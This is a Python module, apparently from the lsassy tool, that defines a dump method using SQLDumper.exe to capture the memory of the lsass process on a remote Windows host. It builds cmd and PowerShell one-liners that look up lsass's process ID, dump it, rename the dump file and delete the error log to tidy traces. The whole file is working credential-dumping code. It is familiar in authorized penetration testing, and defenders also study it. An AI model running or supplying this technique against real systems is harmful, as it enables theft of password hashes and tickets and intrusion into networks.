from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.sqldumper = Dependency("sqldumper", "SQLDumper.exe")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.sqldumper])

    def clean(self):
        self.clean_dependencies([self.sqldumper])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        """
        Little trick in cmd_command is to create a random useless "*.mdmp" file so that DEL will always return TRUE.
        I struggled using some IF EXIST commands, didn't manage to make it work. This little hack makes it work so... :)
        And removing existing .mdmp files is necessary so that we can rename the dump file to our known dump_name.
        """
        cmd_command = """ECHO "" > {}SQLDmpr1337.mdmp & DEL {}SQLDmpr*.mdmp & for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {} %J 0 0x01100:40 0 {} & MOVE {}SQLDmpr0001.mdmp {}{} & DEL {}SQLDUMPER_ERRORLOG.log""".format(
            self.dump_path, self.dump_path, self.sqldumper.get_remote_path(),
            self.dump_path, self.dump_path, self.dump_path, self.dump_name, self.dump_path
        )
        pwsh_command = """DEL {}SQLDmpr*.mdmp; {} (Get-Process lsass).Id 0 0x01100:40 0 {}; Move-Item {}SQLDmpr0001.mdmp {}{}; DEL {}SQLDUMPER_ERRORLOG.log""".format(
            self.dump_path, self.sqldumper.get_remote_path(),
            self.dump_path, self.dump_path, self.dump_path, self.dump_name, self.dump_path
        )

        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
